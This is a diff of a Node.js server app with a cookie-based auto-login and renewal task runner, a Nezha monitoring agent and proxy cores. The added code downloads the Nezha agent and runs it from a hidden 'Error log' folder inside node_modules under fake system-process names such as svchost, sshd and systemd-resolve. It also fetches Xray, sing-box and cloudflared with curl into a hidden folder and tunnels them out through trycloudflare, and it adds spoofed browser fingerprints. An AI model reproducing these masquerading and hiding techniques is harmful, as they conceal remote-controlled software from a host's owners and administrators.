-        } else if (finalCookie) {
-            addTaskLog(task.id, `使用提供的Cookie`, 'info');
-        } else {
-            addTaskLog(task.id, `既没有Cookie也没有登录凭据，无法继续`, 'error');
-            return { success: false, message: '缺少登录凭据或Cookie' };
-        }
-
-        if (!targetUrl) {
-            addTaskLog(task.id, `未指定目标网址`, 'error');
-            return { success: false, message: '未指定目标网址' };
-        }
-        
-        if (!buttonText) {
-            addTaskLog(task.id, `未指定按钮特征词`, 'error');
-            return { success: false, message: '未指定按钮特征词' };
-        }
-
-        // 2. 启动 Playwright
-        addTaskLog(task.id, `启动浏览器...`, 'info');
-        browser = await playwright.chromium.launch({
-            headless: true,
-            args: ['--no-sandbox', '--disable-setuid-sandbox']
-        });
-        
-        const context = await browser.newContext({
-            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-        });
-        
-        // 3. 注入 Cookie
-        try {
-            // 解析 Cookie 字符串
-            const cookieObj = parseCookieToObj(finalCookie);
-            const urlObj = new URL(targetUrl);
-            
-            const cookiesToSet = [];
-            for (const [name, value] of Object.entries(cookieObj)) {
-                cookiesToSet.push({
-                    name,
-                    value,
-                    domain: urlObj.hostname,
-                    path: '/'
-                });
-            }
-            
-            if (cookiesToSet.length > 0) {
-                await context.addCookies(cookiesToSet);
-                addTaskLog(task.id, `已注入 ${cookiesToSet.length} 个 Cookie`, 'info');
-            }
-        } catch (e) {
-            addTaskLog(task.id, `Cookie注入警告: ${e.message}`, 'warning');
-        }
-        
-        const page = await context.newPage();
-        
-        // 4. 导航到目标页面
-        addTaskLog(task.id, `正在访问: ${targetUrl}`, 'info');
-        await page.goto(targetUrl, { waitUntil: 'networkidle', timeout: 30000 }).catch(e => {
-            throw new Error(`页面加载超时或失败: ${e.message}`);
-        });
-        
-        // 5. 智能模糊查找按钮
-        addTaskLog(task.id, `正在查找包含 "${buttonText}" 的按钮...`, 'info');
-        
-        const inputText = buttonText.toLowerCase().trim().replace(/\s+/g, '');
-        let bestElement = null;
-        let bestScore = -1;
-        
-        // 查找所有可能的按钮元素
-        const clickableElements = await page.locator('button, a, input[type="submit"], input[type="button"], [role="button"]').all();
-        
-        for (const el of clickableElements) {
-            try {
-                const text = await el.textContent();
-                const value = await el.getAttribute('value');
-                const title = await el.getAttribute('title');
-                
-                const candidates = [text, value, title].filter(t => t);
-                
-                for (const candidate of candidates) {
-                    const cleanCandidate = candidate.toLowerCase().trim().replace(/\s+/g, '');
-                    
-                    let score = 0;
-                    if (cleanCandidate === inputText) score = 100;
-                    else if (cleanCandidate.includes(inputText)) score = 80;
-                    else if (inputText.includes(cleanCandidate)) score = 60;
-                    
-                    // 简单的模糊匹配 (包含部分字符)
-                    if (score === 0) {
-                        let matchCount = 0;
-                        for (const char of inputText) {
-                            if (cleanCandidate.includes(char)) matchCount++;
-                        }
-                        if (matchCount / inputText.length > 0.5) score = 40;
-                    }
-                    
-                    if (score > bestScore) {
-                        bestScore = score;
-                        bestElement = el;
-                    }
-                }
-            } catch (e) {
-                // 忽略元素读取错误
-            }
-        }
-        
-        if (bestElement) {
-            addTaskLog(task.id, `找到最佳匹配 (评分: ${bestScore})，尝试点击...`, 'info');
-            await bestElement.click({ timeout: 5000 });
-            addTaskLog(task.id, `点击操作执行完成`, 'success');
-            
-            // 截图保存 (可选，这里只做简单记录)
-            const screenshotPath = path.join(__dirname, `screenshots`, `${task.id}_${Date.now()}.png`);
-            try {
-                if (!fsSync.existsSync(path.join(__dirname, `screenshots`))) {
-                    fsSync.mkdirSync(path.join(__dirname, `screenshots`));
-                }
-                await page.screenshot({ path: screenshotPath });
-                addTaskLog(task.id, `已保存截图: ${screenshotPath}`, 'info');
-            } catch(e) {}
-            
-            return { success: true, message: '点击成功' };
-        } else {
-            addTaskLog(task.id, `未找到匹配 "${buttonText}" 的可点击元素`, 'warning');
-            return { success: false, message: '未找到匹配按钮' };
-        }
-        
-    } catch (err) {
-        const message = `Web Click 任务失败: ${err.message}`;
-        addTaskLog(task.id, message, 'error');
-        return { success: false, message: message };
-    } finally {
-        if (browser) {
-            await browser.close();
-        }
-    }
-}
+// ========== 新增：Web Click 任务逻辑 (已删除 Playwright 版) ==========
 
 // ========== 任务中心核心函数 ==========
 function executeTaskLogic(task) {
@@ -2291,9 +1605,7 @@ function executeTaskLogic(task) {
             case 'discord':
                 executeTaskDiscord(task);
                 break;
-            case 'web-click':
-                executeTaskWebClick(task);
-                break;
+            // case 'web-click': 已移除
             default:
                 addTaskLog(task.id, `未知任务类型: ${task.type}`, 'error');
         }
@@ -2320,87 +1632,125 @@ function executeTaskLogic(task) {
 // 执行续期任务（真实执行）
 async function executeTaskRenew(task) {
     try {
-        const { renewUrl, loginUrl, username, password, cookie, method = 'GET' } = task.config;
+        const { renewUrl, loginUrl, username, password, cookie, method = 'GET', renewalBody, customHeaders, lastLoginTime } = task.config;
         
         if (!renewUrl) {
             addTaskLog(task.id, `续期任务失败: 未配置续期URL`, 'error');
             return { success: false, message: '未配置续期URL' };
         }
+
+        // ============================================================
+        // 新增：自动刷新逻辑 (5小时强制重新登录)
+        // ============================================================
+        let finalCookie = cookie || "";
+        const FIVE_HOURS = 5 * 60 * 60 * 1000; // 5小时的毫秒数
+        const now = Date.now();
+        const lastLogin = lastLoginTime ? new Date(lastLoginTime).getTime() : 0;
         
-        let finalCookie = cookie;
-        
-        if ((!finalCookie || finalCookie.trim() === '') && loginUrl && username && password) {
-            addTaskLog(task.id, `正在执行登录获取Cookie...`, 'info');
-            finalCookie = await taskAutoLogin(task.config);
+        // 判断是否需要强制刷新：有账号密码 且 (没登录过 或 超过5小时)
+        const isExpired = (now - lastLogin) >= FIVE_HOURS;
+        const canLogin = loginUrl && username && password;
+
+        if (canLogin && (!finalCookie || isExpired)) {
+            const reason = !finalCookie ? "Cookie为空" : "Cookie已使用超过5小时";
+            addTaskLog(task.id, `${reason}，正在执行自动登录刷新会话...`, 'info');
             
-            if (finalCookie) {
-                task.config.cookie = finalCookie;
+            // 执行登录
+            const newCookie = await taskAutoLogin(task.config);
+            
+            if (newCookie) {
+                finalCookie = newCookie;
+                task.config.cookie = newCookie;
                 task.lastLoginStatus = '已登录';
-                addTaskLog(task.id, `登录成功，已获取Cookie`, 'success');
+                task.config.lastLoginTime = new Date().toISOString(); // 更新登录时间
+                addTaskLog(task.id, `自动登录成功，新会话已就绪`, 'success');
+                
+                // 保存配置到文件
+                await saveTaskCenterConfig(); 
             } else {
-                addTaskLog(task.id, `登录失败，无法获取Cookie`, 'error');
-                return { success: false, message: '登录失败' };
+                // 如果登录失败且原有Cookie也没了，才终止；如果原有Cookie还在，可以尝试硬撞一下
+                if (!finalCookie) {
+                    addTaskLog(task.id, `自动登录失败，任务终止`, 'error');
+                    return { success: false, message: '自动登录失败' };
+                } else {
+                    addTaskLog(task.id, `自动刷新失败，尝试使用旧Cookie继续执行`, 'warning');
+                }
             }
         }
-        
-        const headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
-            'Referer': loginUrl || renewUrl
-        };
-        
-        if (finalCookie && finalCookie.trim()) {
-            headers['Cookie'] = finalCookie;
+
+        // ============================================================
+        // 发送续期请求 (协议战神逻辑保持不变)
+        // ============================================================
+        let cookieStr = finalCookie || '';
+        if (cookieStr) {
+            cookieStr = cookieStr.split(';').map(c => c.trim()).filter(Boolean).join('; ');
         }
-        
-        const requestMethod = method.toUpperCase();
-        const axiosConfig = {
-            method: requestMethod,
+
+        const targetUrlObj = new URL(renewUrl);
+        const commonHeaders = { 
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 
+            'Cookie': cookieStr,
+            'Referer': loginUrl || renewUrl,
+            'Origin': targetUrlObj.origin,
+            'X-Requested-With': 'XMLHttpRequest',
+            'Accept': 'application/json, text/plain, */*'
+        };
+
+        // 提取 CSRF Token
+        try {
+            const match = cookieStr.match(/XSRF-TOKEN=([^;]+)/);
+            if (match && match[1]) commonHeaders['X-XSRF-TOKEN'] = decodeURIComponent(match[1]);
+        } catch(e){}
+
+        if (customHeaders) {
+            try { 
+                const customObj = typeof customHeaders === 'string' ? JSON.parse(customHeaders) : customHeaders;
+                Object.assign(commonHeaders, customObj); 
+            } catch(e){}
+        }
+
+        const reqOptions = {
+            method: method.toUpperCase(),
             url: renewUrl,
-            headers: headers,
-            timeout: 15000,
-            validateStatus: (s) => s < 405
+            headers: commonHeaders,
+            timeout: 25000,
+            validateStatus: (s) => true,
+            maxRedirects: 5
         };
-        
-        addTaskLog(task.id, `发送续期请求: ${requestMethod} ${renewUrl}`, 'info');
-        
-        const response = await axios(axiosConfig);
-        
-        if (response.status === 200) {
-            const message = `续期成功 (状态码: ${response.status})`;
-            addTaskLog(task.id, message, 'success');
-            
-            if (response.headers['set-cookie']) {
-                const newCookie = response.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
-                if (newCookie) {
-                    task.config.cookie = newCookie;
-                    addTaskLog(task.id, `已更新Cookie`, 'info');
+
+        if (['POST', 'PUT', 'PATCH'].includes(reqOptions.method)) {
+            if (renewalBody) {
+                try {
+                    reqOptions.data = JSON.parse(renewalBody);
+                    reqOptions.headers['Content-Type'] = 'application/json';
+                } catch (e) {
+                    reqOptions.data = renewalBody;
+                    reqOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                 }
+            } else {
+                reqOptions.data = {};
             }
-            
-            return { 
-                success: true, 
-                message: message,
-                data: {
-                    status: response.status,
-                    headers: response.headers,
-                    data: typeof response.data === 'string' ? response.data.substring(0, 500) + '...' : response.data
-                }
-            };
-        } else {
-            const message = `续期请求异常 (状态码: ${response.status})`;
-            addTaskLog(task.id, message, 'warning');
-            return { success: false, message: message };
         }
         
+        const res = await axios(reqOptions);
+        
+        if (res.status >= 200 && res.status < 300) {
+            addTaskLog(task.id, `✅ 续期成功 (${res.status})`, 'success');
+            return { success: true, message: '成功' };
+        } else if ([401, 403, 419].includes(res.status)) {
+            addTaskLog(task.id, `❌ 授权失效 (${res.status})，强制清除Cookie下次将重连`, 'error');
+            task.config.cookie = ""; // 清除无效Cookie
+            await saveTaskCenterConfig();
+            return { success: false, message: '授权失效' };
+        } else {
+            addTaskLog(task.id, `❌ 响应异常 (${res.status})`, 'warning');
+            return { success: false, message: '异常' };
+        }
     } catch (err) {
-        const message = `续期任务执行失败: ${err.message}`;
-        addTaskLog(task.id, message, 'error');
-        return { success: false, message: message };
+        addTaskLog(task.id, `请求执行出错: ${err.message}`, 'error');
+        return { success: false, message: err.message };
     }
 }
-
 // 执行AFK任务
 async function executeTaskAFK(task) {
     try {
@@ -2663,7 +2013,7 @@ function addTaskLog(taskId, message, type = 'info') {
     saveTaskCenterConfig().catch(err => {});
 }
 
-// ========== 哪吒探针功能 ==========
+// ========== 哪吒探针配置 (修改版：存放在 node_modules/Error log 并隐藏) ==========
 let nezhaProcess = null;
 let nezhaConfig = { addr: '', key: '', tls: false };
 let nezhaUserStopped = false;
@@ -2673,31 +2023,28 @@ let nezhaRestartTimer = null;
 const MAX_NEZHA_RESTART_ATTEMPTS = 10;
 const NEZHA_RESTART_DELAY = 30000;
 
-function createDeepNestedPath() {
-    let deepPath = __dirname;
-    for (let i = 0; i < 44; i++) {
-        deepPath = path.join(deepPath, 'log');
-    }
-    return deepPath;
-}
+// 定义存储目录
+const NODE_MODULES_DIR = path.join(__dirname, 'node_modules');
+// Windows 下命名为 "Error log"，Linux/Mac 下命名为 ".Error log" 以实现隐藏
+const NEZHA_FOLDER_NAME = process.platform === 'win32' ? 'Error log' : '.Error log';
+const NEZHA_DIR = path.join(NODE_MODULES_DIR, NEZHA_FOLDER_NAME);
 
-function getNezhaConfigPath(filename) {
-    const deepPath = createDeepNestedPath();
-    try {
-        let currentPath = __dirname;
-        for (let i = 0; i < 44; i++) {
-            currentPath = path.join(currentPath, 'log');
-            if (!fsSync.existsSync(currentPath)) {
-                fsSync.mkdirSync(currentPath);
-            }
+// 定义配置文件名 (Linux/Mac 下也加 . 前缀以增强隐藏性)
+const NEZHA_CONFIG_FILENAME = process.platform === 'win32' ? 'nezha_config.json' : '.nezha_config.json';
+const NEZHA_CONFIG_FILE = path.join(NEZHA_DIR, NEZHA_CONFIG_FILENAME);
+
+// 辅助函数：设置文件/文件夹为隐藏 (Windows)
+function setFileHidden(targetPath) {
+    if (process.platform === 'win32') {
+        try {
+            // Windows attrib 命令：+h 设置隐藏
+            execSync(`attrib +h "${targetPath}"`, { stdio: 'ignore', cwd: __dirname });
+        } catch (e) {
+            // 忽略错误，可能是权限问题或文件已隐藏
         }
-    } catch (e) {
-        return path.join(__dirname, filename);
     }
-    return path.join(deepPath, filename);
+    // Linux/Mac 无需额外操作，文件名以 . 开头即为隐藏
 }
-
-const NEZHA_CONFIG_FILE = getNezhaConfigPath('nezha_config.json');
 
 function setupNezhaAutoRestart() {
     if (nezhaProcess) {
@@ -2739,12 +2086,46 @@ async function loadNezhaConfig() {
 
 async function saveNezhaConfig() {
     try {
+        // 确保目录存在
+        if (!fsSync.existsSync(NEZHA_DIR)) {
+            fsSync.mkdirSync(NEZHA_DIR, { recursive: true });
+            setFileHidden(NEZHA_DIR);
+        }
+        
         await fs.writeFile(NEZHA_CONFIG_FILE, JSON.stringify(nezhaConfig, null, 2));
-    } catch (err) {}
+        
+        // 保存后设置配置文件为隐藏 (Windows)
+        setFileHidden(NEZHA_CONFIG_FILE);
+        
+    } catch (err) {
+        console.error('[Nezha] 保存配置失败:', err);
+    }
 }
 
 const AGENT_PREFIX = "sys_cache_";
+// ================= 辅助函数：获取哪吒二进制文件名 =================
+function getNezhaBinaryName() {
+    const isWin = os.platform() === 'win32';
+    const NEZHA_DIR = path.join(__dirname, 'node_modules', isWin ? 'Error log' : '.Error log');
+    
+    // 如果目录不存在，说明肯定是新环境
+    if (!fsSync.existsSync(NEZHA_DIR)) return null;
 
+    try {
+        const files = fsSync.readdirSync(NEZHA_DIR);
+        
+        if (isWin) {
+            // Windows: 查找 svchost_xxx.exe
+            return files.find(f => f.startsWith('svchost_') && f.endsWith('.exe'));
+        } else {
+            // Linux: 查找列表中伪装成系统进程的文件
+            const fakeSystemNames = ['.systemd-resolve', '.dbus-daemon', '.rsyslogd', '.sshd', '.cron'];
+            return files.find(f => fakeSystemNames.includes(f));
+        }
+    } catch (e) {
+        return null;
+    }
+}
 async function startNezha(addr, key, tls = false) {
     if (nezhaProcess) { 
         try { 
@@ -2755,38 +2136,61 @@ async function startNezha(addr, key, tls = false) {
     
     if (!addr || !key) return;
 
-    const deepPath = createDeepNestedPath();
-    
+    // 1. 确保目录存在
     try {
-        let currentPath = __dirname;
-        for (let i = 0; i < 44; i++) {
-            currentPath = path.join(currentPath, 'log');
-            if (!fsSync.existsSync(currentPath)) {
-                fsSync.mkdirSync(currentPath);
-            }
-        }
-    } catch (e) {
-        return;
-    }
-
-    const randomSuffix = crypto.randomBytes(3).toString('hex');
-    const isWin = os.platform() === 'win32';
-    const processName = isWin ? `svchost_${randomSuffix}` : `systemd_${randomSuffix}`;
-    const agentName = isWin ? `${AGENT_PREFIX}${randomSuffix}.exe` : `${AGENT_PREFIX}${randomSuffix}`;
-    const agentPath = path.join(deepPath, agentName);
-
-    try {
-        const files = await fs.readdir(deepPath);
-        for (const file of files) {
-            if (file.startsWith(AGENT_PREFIX)) {
-                try {
-                    await fs.unlink(path.join(deepPath, file));
-                } catch(unlinkErr) {}
-            }
+        if (!fsSync.existsSync(NEZHA_DIR)) {
+            fsSync.mkdirSync(NEZHA_DIR, { recursive: true });
+            setFileHidden(NEZHA_DIR);
         }
     } catch (e) {}
 
-    if (!fsSync.existsSync(agentPath)) {
+    const isWin = os.platform() === 'win32';
+    
+    // 2. 随机生成伪装名 (保持原有逻辑：伪装成系统进程)
+    let fakeProcessName = "";
+    const randomSuffix = crypto.randomBytes(3).toString('hex');
+    
+    if (isWin) {
+        fakeProcessName = `svchost_${randomSuffix}.exe`;
+    } else {
+        const fakeSystemNames = ['.systemd-resolve', '.dbus-daemon', '.rsyslogd', '.sshd', '.cron'];
+        fakeProcessName = fakeSystemNames[Math.floor(Math.random() * fakeSystemNames.length)];
+    }
+
+    const targetPath = path.join(NEZHA_DIR, fakeProcessName);
+
+    // 3. 智能检查与复用 (核心修改：不重新下载)
+    let reusableFileFound = false;
+
+    try {
+        const files = fsSync.readdirSync(NEZHA_DIR);
+        
+        for (const file of files) {
+            const fullPath = path.join(NEZHA_DIR, file);
+            
+            if (file.endsWith('.json') || file.endsWith('.yml')) continue;
+            if (file === fakeProcessName) continue;
+
+            const isNezhaBinary = file.includes('nezha-agent');
+            const isOldWinFake = file.includes('svchost_');
+            const isOldLinuxFake = ['.systemd-resolve', '.dbus-daemon', '.rsyslogd', '.sshd', '.cron'].includes(file);
+            
+            if (fsSync.statSync(fullPath).isFile() && (isNezhaBinary || isOldWinFake || isOldLinuxFake)) {
+                try {
+                    fsSync.renameSync(fullPath, targetPath);
+                    reusableFileFound = true;
+                    
+                    if (!isWin) {
+                        try { fsSync.chmodSync(targetPath, 0o755); } catch(e) {}
+                    }
+                    break;
+                } catch (renameErr) {}
+            }
+        }
+    } catch (scanErr) {}
+
+    // 4. 只有找不到复用文件时，才下载
+    if (!reusableFileFound) {
         const arch = os.arch() === 'arm64' ? 'arm64' : 'amd64';
         const platform = isWin ? 'windows' : 'linux';
         const url = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_${platform}_${arch}.zip`;
@@ -2794,17 +2198,20 @@ async function startNezha(addr, key, tls = false) {
         try {
             const resp = await axios.get(url, { responseType: 'arraybuffer', timeout: 30000 });
             const zip = new AdmZip(Buffer.from(resp.data));
-            zip.extractAllTo(deepPath, true);
+            zip.extractAllTo(NEZHA_DIR, true);
 
             const originalName = isWin ? 'nezha-agent.exe' : 'nezha-agent';
             let found = false;
+            let extractedOriginalPath = "";
 
             const scanAndRename = (dir) => {
                 const items = fsSync.readdirSync(dir);
                 for (const item of items) {
                     const fullP = path.join(dir, item);
+                    if (!isWin && item.startsWith('.') && item !== originalName) continue;
+                    
                     if (item === originalName) {
-                        fsSync.renameSync(fullP, agentPath);
+                        extractedOriginalPath = fullP;
                         found = true; 
                         break;
                     } else if (fsSync.statSync(fullP).isDirectory()) {
@@ -2812,59 +2219,46 @@ async function startNezha(addr, key, tls = false) {
                     }
                 }
             };
-            scanAndRename(deepPath);
+            scanAndRename(NEZHA_DIR);
 
-            if (!found) throw new Error("解压后的包内未找到二进制文件");
+            if (!found || !extractedOriginalPath) throw new Error("Binary not found");
             
+            fsSync.renameSync(extractedOriginalPath, targetPath);
+            
+            setFileHidden(targetPath);
             if (!isWin) {
-                try {
-                    execSync(`chmod 777 "${agentPath}"`, { stdio: 'ignore' });
-                } catch(chmodErr) {}
+                try { fsSync.chmodSync(targetPath, 0o755); } catch(e) {}
             }
-        } catch (e) {
-            return;
-        }
+        } catch (e) {}
     }
 
     const isTls = (tls || addr.includes(':443')) ? 'true' : 'false';
+    
+    // --- 配置文件逻辑 ---
+    const configFileName = process.platform === 'win32' ? 'config.yml' : '.config.yml';
+    const ymlPath = path.join(NEZHA_DIR, configFileName);
+
+    if (fsSync.existsSync(ymlPath)) {
+        setFileHidden(ymlPath);
+    }
+
     try {
-        nezhaProcess = spawn(agentPath, [], {
-            cwd: deepPath,
-            stdio: 'ignore',
+        nezhaProcess = spawn(targetPath, [], {
+            cwd: NEZHA_DIR, 
+            stdio: ['ignore', 'ignore', 'ignore'],
             env: {
                 ...process.env,
                 NZ_SERVER: addr,
                 NZ_PASSWORD: key,
                 NZ_CLIENT_SECRET: key,
                 NZ_TLS: isTls,
-                NZ_CONFIG_FILE: path.join(deepPath, 'config.yml')
+                NZ_CONFIG_FILE: ymlPath 
             },
             ...(process.platform !== 'win32' && { 
-                detached: true,
-                stdio: ['ignore', 'ignore', 'ignore']
+                detached: true
             })
         });
-
-        if (isWin && nezhaProcess.pid) {
-            try {
-                execSync(`taskkill /PID ${nezhaProcess.pid} /T /F >nul 2>&1`, { stdio: 'ignore' });
-                const renamedAgentPath = path.join(deepPath, processName + (isWin ? '.exe' : ''));
-                fsSync.renameSync(agentPath, renamedAgentPath);
-                nezhaProcess = spawn(renamedAgentPath, [], {
-                    cwd: deepPath,
-                    stdio: 'ignore',
-                    env: {
-                        ...process.env,
-                        NZ_SERVER: addr,
-                        NZ_PASSWORD: key,
-                        NZ_CLIENT_SECRET: key,
-                        NZ_TLS: isTls,
-                        NZ_CONFIG_FILE: path.join(deepPath, 'config.yml')
-                    }
-                });
-            } catch (renameErr) {}
-        }
-
+    
         setupNezhaAutoRestart();
         
     } catch (e) {
@@ -2881,109 +2275,136 @@ async function startNezha(addr, key, tls = false) {
     }
 }
 
-// ========== 代理服务器功能 ==========
-const PROXY_PORT = 8080;
+// ========== 代理服务器功能 (包含 Sinbox 切换 + 随机端口) ==========
+const PROXY_PORT = 8080; // 外部隧道连接端口 (Node.js)
+let currentInternalPort = 20001; // 内部核心端口 (随机生成)
+
+const PROXY_DIR = path.join(__dirname, 'node_modules', '.proxy_core');
 let xrayProcess = null;
+let sinboxProcess = null; 
 let cfProcess = null;
 let tunnelUrl = "";
-let currentNodeInfo = { type: '', uuid: '' };
+let currentNodeInfo = { type: '', uuid: '', coreType: 'xray' }; 
 let proxyWss = null;
 let isProxyStopped = false;
-let xrayConfigDeleteTimer = null; // 用于删除xray_config.json的定时器
+let xrayConfigDeleteTimer = null; 
+let currentWsPath = ""; 
 
-// 修复：全局变量声明，确保文件名在整个应用生命周期中保持一致
+// 文件名变量
 let xrayName = null;
+let sinboxName = null;
 let cfName = null;
 let xrayPath = null;
+let sinboxPath = null;
 let cfPath = null;
 
-// 修复：初始化代理文件名
+// 生成随机端口函数 (10000 - 65000)
+function getRandomPort() {
+    return Math.floor(Math.random() * (65000 - 10000 + 1)) + 10000;
+}
+
+// 初始化代理文件名
 function initProxyFilenames() {
-    // 只在第一次初始化时生成文件名
-    if (!xrayName || !cfName) {
+    if (!xrayName || !sinboxName || !cfName) {
         xrayName = getRandName('x_');
+        sinboxName = getRandName('s_'); 
         cfName = getRandName('c_');
-        xrayPath = path.join(__dirname, xrayName);
-        cfPath = path.join(__dirname, cfName);
+        
+        xrayPath = path.join(PROXY_DIR, xrayName);
+        sinboxPath = path.join(PROXY_DIR, sinboxName);
+        cfPath = path.join(PROXY_DIR, cfName);
     }
 }
 
-// 修改：确保每次调用都能获取正确的文件名
+// 随机文件名生成函数
 function getRandName(prefix) {
-    const files = fsSync.readdirSync(__dirname);
+    if (!fsSync.existsSync(PROXY_DIR)) {
+        try { fsSync.mkdirSync(PROXY_DIR, { recursive: true }); } catch (e) { }
+    }
+    const files = fsSync.readdirSync(PROXY_DIR);
     const existing = files.find(f => f.startsWith(prefix) && f.length > 5);
     if (existing) return existing;
     return prefix + crypto.randomBytes(4).toString('hex');
 }
 
-// 修改：改进的初始化函数
+// 初始化环境 (支持双核心下载)
 function initProxyEnvironment() {
-    // 初始化文件名
     initProxyFilenames();
-    
-    // 下载Xray核心（如果不存在）
+
+    if (!fsSync.existsSync(PROXY_DIR)) {
+        try { fsSync.mkdirSync(PROXY_DIR, { recursive: true }); } catch (e) { }
+    }
+
+    // 1. 下载 Xray 核心
     if (!fsSync.existsSync(xrayPath)) {
         try {
-            // 控制台输出控制：不打印下载成功信息
-            execSync(`curl -L -s https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o x.zip && unzip -o x.zip xray && mv xray ${xrayName} && chmod +x ${xrayName} && rm -f x.zip`, { stdio: 'ignore' });
-        } catch (e) { 
-            // 静默失败
+            const arch = os.arch();
+            let url = "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip";
+            if (arch === 'arm64' || arch === 'aarch64') url = "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-arm64-v8a.zip";
+            
+            console.log("[Proxy] Downloading Xray core...");
+            execSync(`curl -L -s "${url}" -o x.zip && unzip -o x.zip xray && mv xray ${xrayName} && chmod +x ${xrayName} && rm -f x.zip`, { cwd: PROXY_DIR, stdio: 'ignore' });
+        } catch (e) { console.error("[Proxy] Xray download error:", e.message); }
+    }
+    
+    // 2. 下载 Sing-box 核心
+    if (!fsSync.existsSync(sinboxPath)) {
+        try {
+            const arch = os.arch();
+            let sbArch = "amd64";
+            if (arch === 'arm64' || arch === 'aarch64') sbArch = "arm64";
+            const sbUrl = `https://github.com/SagerNet/sing-box/releases/download/v1.8.11/sing-box-1.8.11-linux-${sbArch}.tar.gz`;
+
+            console.log(`[Proxy] Downloading Real Sing-box core (${sbArch})...`);
+            execSync(`curl -L -s "${sbUrl}" -o s.tar.gz && tar -xzf s.tar.gz --wildcards "*/sing-box" --strip-components=1 && mv sing-box ${sinboxName} && chmod +x ${sinboxName} && rm -f s.tar.gz`, { 
+                cwd: PROXY_DIR, 
+                stdio: 'ignore' 
+            });
+            console.log("[Proxy] Sing-box installed.");
+        } catch (e) {
+            console.error("[Proxy] Sing-box download failed:", e.message);
         }
     }
     
-    // 下载Cloudflared（如果不存在）
+    // 3. Cloudflared
     if (!fsSync.existsSync(cfPath)) {
         try {
-            // 控制台输出控制：不打印下载成功信息
-            execSync(`curl -L -s https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ${cfName} && chmod +x ${cfName}`, { stdio: 'ignore' });
-        } catch (e) { 
-            // 静默失败
-        }
+            execSync(`curl -L -s https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ${cfName} && chmod +x ${cfName}`, { cwd: PROXY_DIR, stdio: 'ignore' });
+        } catch (e) { }
     }
 }
 
-// 修复：改进的startProxy函数
+// 启动代理总入口
 function startProxy() {
-    isProxyStopped = false; // 清除手动停止标记
-    
-    // 确保文件存在
+    isProxyStopped = false;
     initProxyEnvironment();
-    
-    // 启动隧道
     startTunnel();
-    
-    // 如果当前有节点信息，启动Xray
     if (currentNodeInfo.type && currentNodeInfo.uuid) {
-        startXray(currentNodeInfo.type, currentNodeInfo.uuid);
+        startProxyCore(currentNodeInfo.coreType || 'xray', currentNodeInfo.type, currentNodeInfo.uuid);
     }
 }
 
-// 修改：改进的startTunnel函数
+// 启动隧道
 function startTunnel() {
     if (cfProcess) {
-        try {
-            cfProcess.kill('SIGKILL');
-        } catch (e) {}
+        try { cfProcess.kill('SIGKILL'); } catch (e) {}
         cfProcess = null;
     }
     
     if (isProxyStopped) return;
     
-    // 确保文件存在
     initProxyEnvironment();
     
     if (!fsSync.existsSync(cfPath)) {
-        // 尝试重新下载
         try {
-            execSync(`curl -L -s https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ${cfName} && chmod +x ${cfName}`, { stdio: 'ignore' });
-        } catch (e) {
-            return;
-        }
+            execSync(`curl -L -s https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ${cfName} && chmod +x ${cfName}`, { cwd: PROXY_DIR, stdio: 'ignore' });
+        } catch (e) { return; }
     }
     
     cfProcess = spawn(`./${cfName}`, ['tunnel', '--url', `http://127.0.0.1:${PROXY_PORT}`, '--no-autoupdate'], { 
-    stdio: ['ignore', 'ignore', 'pipe'] // stdin/stdout 忽略，但保留 stderr 管道
-});
+        cwd: PROXY_DIR, 
+        stdio: ['ignore', 'ignore', 'pipe'] 
+    });
     
     cfProcess.stderr.on('data', (data) => {
         const match = data.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
@@ -2993,163 +2414,211 @@ function startTunnel() {
     cfProcess.on('exit', (code) => {
         cfProcess = null;
         if (!isProxyStopped) {
-            setTimeout(() => {
-                startTunnel();
-            }, 5000);
+            setTimeout(() => { startTunnel(); }, 5000);
         }
     });
 }
 
-// 修改：改进的startXray函数，添加1分钟后删除xray_config.json的功能
-function startXray(type, uuid) {
-    if (xrayProcess) {
-        try {
-            xrayProcess.kill('SIGKILL');
-        } catch (e) {}
-        xrayProcess = null;
+// 浏览器指纹库
+const BROWSER_FINGERPRINTS = [
+    {
+        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        ch_ua: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        platform: "Windows",
+        mobile: "?0"
+    },
+    {
+        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+        ch_ua: '"Safari";v="17.1", "Chromium";v="120", "Not?A_Brand";v="99"',
+        platform: "macOS",
+        mobile: "?0"
     }
-    
-    // 清除之前的删除定时器
-    if (xrayConfigDeleteTimer) {
-        clearTimeout(xrayConfigDeleteTimer);
-        xrayConfigDeleteTimer = null;
-    }
-    
+];
+
+function getRandomFingerprint() {
+    const index = Math.floor(Math.random() * BROWSER_FINGERPRINTS.length);
+    return BROWSER_FINGERPRINTS[index];
+}
+
+// ================= 启动核心 (双核 + 随机端口) =================
+function startProxyCore(coreType, type, uuid) {
+    // 1. 清理旧进程
+    if (xrayProcess) { try { xrayProcess.kill('SIGKILL'); } catch(e) {} xrayProcess = null; }
